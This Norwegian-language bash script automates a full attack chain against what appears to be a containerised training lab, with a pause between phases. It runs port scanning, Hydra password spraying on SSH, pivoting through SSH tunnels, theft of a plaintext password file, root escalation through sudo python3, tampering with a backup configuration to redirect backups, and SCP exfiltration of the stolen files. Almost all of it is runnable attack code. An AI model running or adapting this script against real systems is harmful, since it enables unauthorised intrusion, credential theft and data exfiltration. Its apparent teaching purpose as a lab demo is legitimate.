#!/bin/bash

# ─────────────────────────────────────────────────────────────────────────────
# Farger
# ─────────────────────────────────────────────────────────────────────────────

RED=$'\033[0;31m'
RESET=$'\033[0m'

# ─────────────────────────────────────────────────────────────────────────────
# Hjelpefunksjoner
# ─────────────────────────────────────────────────────────────────────────────

pause() {
    echo ""
    read -p "Trykk ENTER for å fortsette til neste fase..."
    echo ""
}

separator() {
    echo -e "${RED}──────────────────────────────────────────────────────────────────${RESET}"
}

header() {
    echo ""
    separator
    echo -e "  ${RED}$1${RESET}"
    separator
}

info()    { echo "  [*] $1"; }
ok()      { echo "  [+] $1"; }
warn()    { echo "  [-] $1"; }
finding() { echo "  [!] $1"; }

vent_paa_port() {
    local port=$1
    for i in $(seq 1 20); do
        ss -lntp | grep -q ":$port" && return 0
        sleep 0.5
    done
    return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# Posisjon og nettverkssti
#
# vis_posisjon <sti> <maskin> <ip> <nettverk>
#
# Sti-argumentet er en ferdig formatert streng, f.eks.:
#   "ATTACKER (*)"
#   "ATTACKER ──SSH──> PROXY (*)"
#   "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)"
# ─────────────────────────────────────────────────────────────────────────────

vis_posisjon() {
    local sti="$1"
    local maskin="$2"
    local ip="$3"
    local nett="$4"

    echo ""
    echo "  $sti"
    echo "  ┌─────────────────────────────────────────────┐"
    echo "  │  Posisjon : $maskin"
    echo "  │  IP       : $ip"
    echo "  │  Nettverk : $nett"
    echo "  └─────────────────────────────────────────────┘"
    echo ""
}


# ─────────────────────────────────────────────────────────────────────────────
# FASE 1 – Rekognosering
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 1 – Rekognosering"

echo ""
echo "  ┌─────────────────────────────────────────────────────────────────┐"
echo "  │  NETTVERKSTOPOLOGI                                              │"
echo "  ├─────────────────────────────────────────────────────────────────┤"
echo "  │                                                                 │"
echo "  │  [ ATTACKER       172.20.0.50 ]  (internett)                    │"
echo "  │        │                                                        │"
echo "  │        │  :22 SSH / :80 HTTP                                    │"
echo "  │        ▼                                                        │"
echo "  │  [ REVERSE-PROXY  172.20.0.10 ] ──── frontend-nett              │"
echo "  │                   172.21.0.10   ──── backend-nett               │"
echo "  │        │                                                        │"
echo "  │        ├──────────────────────────┐                             │"
echo "  │        ▼                          ▼                             │"
echo "  │  [ WEBAPP  172.21.0.20 ]   [ DB  172.21.0.30 ]                  │"
echo "  │        │                                                        │"
echo "  │        ▼                                                        │"
echo "  │  [ ADMINPC        172.21.0.40 ] ──── backend-nett               │"
echo "  │                   172.22.0.20   ──── internt nett               │"
echo "  │                   172.23.0.20   ──── backup-nett                │"
echo "  │        │                                                        │"
echo "  │        ▼                                                        │"
echo "  │  [ FILSERVER  172.22.0.10 ]    [ BRUKERPC  172.22.0.30 ]        │"
echo "  │                                                                 │"
echo "  │  [ BACKUPSERVER   172.23.0.67 ]                                 │"
echo "  │                                                                 │"
echo "  └─────────────────────────────────────────────────────────────────┘"

vis_posisjon \
    "ATTACKER (*)" \
    "ATTACKER" \
    "172.20.0.50" \
    "internett / frontend-nett (172.20.0.0/24)"

echo "  Mål    : Kartlegge eksponerte tjenester på reverse-proxyen."
echo "  Verktøy: nmap, netcat"
echo ""

info "Kjører port-scan mot 172.20.0.10..."
echo ""

nmap -sT -p 22,80 172.20.0.10 | grep -v "^Nmap scan report" | grep -v "^Host is up"

echo ""
info "Henter SSH-banner..."
SSH_BANNER=$(timeout 3 nc 172.20.0.10 22 2>/dev/null | head -n1)
echo "  Banner: $SSH_BANNER"
echo ""

finding "Port 22 (SSH) og port 80 (HTTP) er åpne mot internett."
finding "SSH-banneret avslører OS og versjon: $SSH_BANNER"

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 2 – Password spray mot proxy
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 2 – Password spray mot Proxy (SSH)"

vis_posisjon \
    "ATTACKER (*)" \
    "ATTACKER" \
    "172.20.0.50" \
    "internett / frontend-nett (172.20.0.0/24)"

echo "  Mål    : Finne gyldige SSH-kredentialer på proxyen."
echo "  Verktøy: Hydra"
echo ""

echo "  ┌─────────────────────────────────────────────┐"
echo "  │  Ordlister                                  │"
echo "  │  Brukernavn : /workspace/users.txt          │"
echo "  │  Passord    : /workspace/passwords.txt      │"
echo "  │                                             │"
echo "  │  Vanlige admin-brukernavn og passord –      │"
echo "  │  typiske standardoppsett i norske systemer. │"
echo "  └─────────────────────────────────────────────┘"
echo ""
info "Kjører password spray mot SSH på 172.20.0.10..."
echo ""

RESULT=$(hydra -q -L /workspace/users.txt -P /workspace/passwords.txt ssh://172.20.0.10 -s 22 -t 4 -f 2>/dev/null | grep '\[22\]\[ssh\]')
echo "$RESULT"

PROXY_SSH_USER=$(echo "$RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
PROXY_SSH_PASS=$(echo "$RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')

echo ""
finding "Gyldig konto funnet."
echo "  Brukernavn : $PROXY_SSH_USER"
echo "  Passord    : $PROXY_SSH_PASS"

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 3 – Fotfeste på proxy + oppsett av SSH-videresending
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 3 – Fotfeste på Proxy og oppsett av SSH-videresending"

vis_posisjon \
    "ATTACKER ──SSH──> PROXY (*)" \
    "REVERSE-PROXY" \
    "172.20.0.10 / 172.21.0.10" \
    "frontend-nett + backend-nett"

echo "  Mål    : Bruke proxyen som pivot-punkt inn i det interne nettverket."
echo "  Teknikk: SSH port forwarding"
echo ""

# ─── Hjelpefunksjoner ────────────────────────────────────────────────────────

run_proxy() {
  sshpass -p "$PROXY_SSH_PASS" ssh \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 \
    "$PROXY_SSH_USER@172.20.0.10" "$1"
}

setup_tunnel() {
    local name="$1"
    local local_port="$2"
    local remote_host="$3"
    local remote_port="$4"
    local via_host="$5"
    local max_retries=3

    for attempt in $(seq 1 $max_retries); do
        info "$name: forsøk $attempt/$max_retries..."
        pkill -f "127.0.0.1:${local_port}" 2>/dev/null
        sleep 0.3

        sshpass -p "$PROXY_SSH_PASS" ssh -N \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o LogLevel=ERROR \
            -o ServerAliveInterval=10 \
            -o ServerAliveCountMax=3 \
            -o ConnectTimeout=10 \
            -L "127.0.0.1:${local_port}:${remote_host}:${remote_port}" \
            "$PROXY_SSH_USER@${via_host}" &

        if vent_paa_port "$local_port"; then
            ok "$name etablert: 127.0.0.1:${local_port} → ${remote_host}:${remote_port}"
            return 0
        fi

        warn "$name feilet på forsøk $attempt, prøver igjen..."
        sleep 1
    done

    warn "$name kunne ikke etableres etter $max_retries forsøk"
    return 1
}

# ─── SSH-tilgang og nettverkskartlegging ─────────────────────────────────────

info "Verifiserer SSH-tilgang til proxy..."
sshpass -p "$PROXY_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 \
  "$PROXY_SSH_USER@172.20.0.10" "echo SSH_OK" \
  || { warn "SSH feilet – avbryter."; exit 1; }
ok "SSH-tilgang bekreftet."
sleep 1

echo ""
info "Nettverksgrensesnitt på proxy:"
run_proxy "ip -o -4 addr show" | awk '{print "  " $2 "\t" $4}'

echo ""
finding "Proxyen ser både frontend-nett (172.20.0.x) og backend-nett (172.21.0.x)."

echo ""
info "Port-scan fra proxy mot interne maskiner..."
echo ""

run_proxy '
for ip in 172.21.0.20 172.21.0.30 172.21.0.40; do
  echo "  Mål: $ip"
  for port in 22 5000 5432; do
    if timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null; then
      echo "    Port $port : OPEN"
    else
      echo "    Port $port : closed"
    fi
  done
done
'

echo ""
finding "Interne maskiner identifisert:"
echo "  172.21.0.20 – webapp     (port 5000)"
echo "  172.21.0.30 – database   (port 5432)"
echo "  172.21.0.40 – adminpc    (port 22)"

echo ""
info "Setter opp SSH-videresending til adminpc (172.21.0.40:22 → 127.0.0.1:2223)..."
setup_tunnel "Videresending" 2223 172.21.0.40 22 172.20.0.10 \
  || { warn "Avbryter – videresending feilet."; exit 1; }

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 4 – Password spray mot adminpc
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 4 – Password spray mot AdminPC"

vis_posisjon \
    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
    "ADMINPC" \
    "172.21.0.40" \
    "backend-nett (172.21.0.0/24)"

echo "  Mål    : Finne SSH-passord til bruker på adminpc."
echo "  Verktøy: Hydra (127.0.0.1:2223)"
echo ""

echo "  ┌─────────────────────────────────────────────┐"
echo "  │  Ordlister                                  │"
echo "  │  Brukernavn : /workspace/usersOla.txt       │"
echo "  │  Passord    : /workspace/passwordsOla.txt   │"
echo "  │                                             │"
echo "  │  Målrettet liste mot kjente interne         │"
echo "  │  brukernavn og svake personlige passord.    │"
echo "  └─────────────────────────────────────────────┘"
echo ""
info "Kjører password spray mot adminpc (127.0.0.1:2223)..."
echo ""

ADMINPC_RESULT=$(hydra -q -L /workspace/usersOla.txt \
  -P /workspace/passwordsOla.txt \
  ssh://127.0.0.1 -s 2223 \
  -t 4 -f 2>/dev/null | grep '\[2223\]\[ssh\]')
echo "$ADMINPC_RESULT"

ADMINPC_SSH_USER=$(echo "$ADMINPC_RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
ADMINPC_SSH_PASS=$(echo "$ADMINPC_RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')

echo ""
finding "Gyldig konto funnet på adminpc."
echo "  Brukernavn : $ADMINPC_SSH_USER"
echo "  Passord    : $ADMINPC_SSH_PASS"

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 5 – Rekognosering på adminpc
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 5 – Rekognosering på AdminPC"

vis_posisjon \
    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
    "ADMINPC" \
    "172.21.0.40 / 172.22.0.20 / 172.23.0.20" \
    "backend-nett + internt nett + backup-nett"

echo "  Mål: Kartlegge brukermiljø, nettverkstilknytning og sensitive filer."
echo ""

info "Brukerinformasjon:"
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "whoami && id && hostname" | sed 's/^/  /'

echo ""
info "Nettverksgrensesnitt:"
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "ip -o -4 addr show | awk '{print \$2, \$4}' | grep -E '172\.'" | sed 's/^/  /'

echo ""
finding "Adminpc er tilkoblet tre nett: backend, internt og backup."

echo ""
info "Filstruktur i hjemmemappe:"
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "ls -R /home/ola_nordmann" | sed 's/^/  /'

echo ""
info "Søker etter passordfiler..."
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "find /home/ola_nordmann -iname '*passord*' -type f 2>/dev/null" | sed 's/^/  /'

echo ""
info "Innhold i passordfilen:"
echo ""
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "cat /home/ola_nordmann/personal/passord.txt" | sed 's/^/  /'

echo ""
finding "Klartekst-passordliste funnet – inkluderer passord til drift-konto."

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 6 – Lateral movement til drift + privilege escalation til root
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 6 – Lateral movement og Privilege Escalation til root"

vis_posisjon \
    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*)" \
    "ADMINPC (som drift → root)" \
    "172.21.0.40" \
    "backend-nett (172.21.0.0/24)"

echo "  Mål    : Logge inn som drift og eskalere til root via sudo python3."
echo "  Teknikk: Credential reuse + GTFOBins"
echo ""

DRIFT_PASSORD=$(sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "grep '^drift' /home/ola_nordmann/personal/passord.txt | awk -F'-  ' '{print \$2}'")

DRIFT_B64=$(printf '%s' "$DRIFT_PASSORD" | base64)

info "Logger inn som drift..."
DRIFT_INFO=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "whoami && id" 2>/dev/null)

DRIFT_USER=$(echo "$DRIFT_INFO" | head -1)
DRIFT_UID=$(echo "$DRIFT_INFO" | tail -1 | sed 's/uid=\([0-9]*\).*/\1/')
DRIFT_GRUPPER=$(echo "$DRIFT_INFO" | tail -1 | sed 's/.*groups=\(.*\)/\1/')

echo "  ┌─────────────────────────────────────────────┐"
echo "  │  Bruker  : $DRIFT_USER"
echo "  │  UID     : $DRIFT_UID"
echo "  │  Grupper : $DRIFT_GRUPPER"
echo "  └─────────────────────────────────────────────┘"

echo ""
finding "Innlogget som drift – sudo-gruppemedlem."


echo ""
info "Søker etter interessante konfigurasjonsfiler på systemet..."
CONF_FUNN=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "find /etc -maxdepth 1 -name '*.conf' 2>/dev/null")
echo "$CONF_FUNN" | sed 's/^/  /'

echo ""
info "Forsøker å lese /etc/backup.conf som drift..."
BACKUP_TILGANG=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "cat /etc/backup.conf 2>&1")
echo "  $BACKUP_TILGANG"

echo ""
info "Sjekker cron-jobber for backup-aktivitet..."
CRON_FUNN=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "grep -r 'backup' /etc/cron* /var/spool/cron/ 2>/dev/null | grep -v '^Binary'")
echo "$CRON_FUNN" | sed 's/^/  /'

echo ""
finding "Backup-jobb oppdaget – kjøres periodisk av cron."
finding "/etc/backup.conf eksisterer men er ikke lesbar som drift – krever root."

echo ""
info "Sudo-rettigheter for drift:"
SUDO_RAW=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "echo '$DRIFT_B64' | base64 -d | sudo -S -l 2>/dev/null")

echo "  ┌─────────────────────────────────────────────┐"
echo "$SUDO_RAW" | grep -A99 "may run" | grep -v "may run" | grep -v "^$" \
  | tr -s " " | sed 's/^ */  │  /'
echo "  └─────────────────────────────────────────────┘"

echo ""
info "Eskalerer til root via sudo python3..."
ROOT_ID=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  'sudo python3 -c "import os; os.system(\"id\")"')

echo "  ┌─────────────────────────────────────────────┐"
echo "  │  $ROOT_ID"
echo "  └─────────────────────────────────────────────┘"

echo ""
finding "Root-tilgang oppnådd på adminpc."


PY='import os; os.system("cat /etc/backup.conf")'


echo ""
info "Leser /etc/backup.conf som root..."
BACKUP_CONF=$(sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "sudo python3 -c '$PY'" 2>/dev/null)

echo "  ┌─────────────────────────────────────────────┐"
echo "$BACKUP_CONF" | sed 's/^/  │  /'
echo "  └─────────────────────────────────────────────┘"

echo ""
finding "Backup sender filer til ekstern host med hardkodet passord."
finding "Vi kontrollerer nå systemet – backup-destinasjonen kan manipuleres."

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 7 – Manipulering av backup.conf som root
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 7 – Manipulering av backup-konfigurasjon"

vis_posisjon \
    "ATTACKER ──SSH──> PROXY ──> ADMINPC (*) ··> BACKUPSERVER" \
    "ADMINPC (som root)" \
    "172.21.0.40 / 172.23.0.20" \
    "backend-nett + backup-nett"

echo "  Mål    : Endre backup.conf slik at neste backup sendes til proxyen."
echo "  Teknikk: Config tampering som root"
echo ""

info "Opprinnelig backup.conf:"
sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "sudo python3 -c '$PY'" 2>/dev/null | sed 's/^/  /'

echo ""
info "Endrer destinasjon fra backupserver (172.23.0.67) til proxy (172.21.0.10)..."

sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "echo '$DRIFT_B64' | base64 -d | sudo -S python3 -c \"
import os
conf = open('/etc/backup.conf').read()
conf = conf.replace('BACKUP_HOST=172.23.0.67', 'BACKUP_HOST=172.21.0.10')
conf = conf.replace('BACKUP_USER=backupuser', 'BACKUP_USER=webadmin')
conf = conf.replace('BACKUP_PASS=Backup123', 'BACKUP_PASS=admin')
conf = conf.replace('BACKUP_DEST=/data', 'BACKUP_DEST=/home/webadmin')
open('/etc/backup.conf', 'w').write(conf)
\" 2>/dev/null"

echo ""
info "Oppdatert backup.conf:"
sshpass -p "$DRIFT_PASSORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "drift@127.0.0.1" \
  "sudo python3 -c '$PY'" 2>/dev/null | sed 's/^/  /'

echo ""
finding "backup.conf endret – neste cron-kjøring sender backup til proxyen."

pause


# ─────────────────────────────────────────────────────────────────────────────
# FASE 8 – Vent på cron-jobb og eksfiltrering
# ─────────────────────────────────────────────────────────────────────────────

header "FASE 8 – Eksfiltrering av sensitive data"

vis_posisjon \
    "ATTACKER (*) <──SCP── PROXY <··cron··< ADMINPC" \
    "ATTACKER (henter fra proxy)" \
    "172.20.0.50" \
    "internett / frontend-nett (172.20.0.0/24)"

echo "  Mål    : Hente backup-filen fra proxyen etter at cron-jobben har kjørt."
echo "  Teknikk: SCP via kompromittert proxy-konto"
echo ""

info "Venter på at backup dukker opp på proxy (sjekker hvert 15. sekund)..."
echo ""

while true; do
  RESULT=$(sshpass -p "$PROXY_SSH_PASS" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o LogLevel=ERROR \
    "$PROXY_SSH_USER@172.20.0.10" \
    "test -f /home/webadmin/backup.zip && echo OK")

  if [ "$RESULT" = "OK" ]; then
    ok "Backup mottatt på proxy."
    break
  fi

  warn "Ikke mottatt ennå – prøver igjen om 15 sekunder..."
  sleep 15
done

echo ""
info "Laster ned backup til angriper..."
sshpass -p "$PROXY_SSH_PASS" scp \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "$PROXY_SSH_USER@172.20.0.10:/home/webadmin/backup.zip" \
  /root/loot.zip

ok "Eksfiltrering fullført: /root/loot.zip"
ls -lh /root/loot.zip | sed 's/^/  /'

echo ""
info "Pakker ut filer..."
unzip -o /root/loot.zip -d /root/ > /dev/null 2>&1
rm /root/loot.zip

echo ""
finding "Eksfiltrerte filer:"
ls -lh /root/*.xlsx /root/*.docx /root/*.zip /root/*.pdf 2>/dev/null \
  | awk '{print "  " $NF "\t(" $5 ")"}'

echo ""
separator
echo ""
echo "  Angrepskjede fullført."
echo ""
separator
echo ""
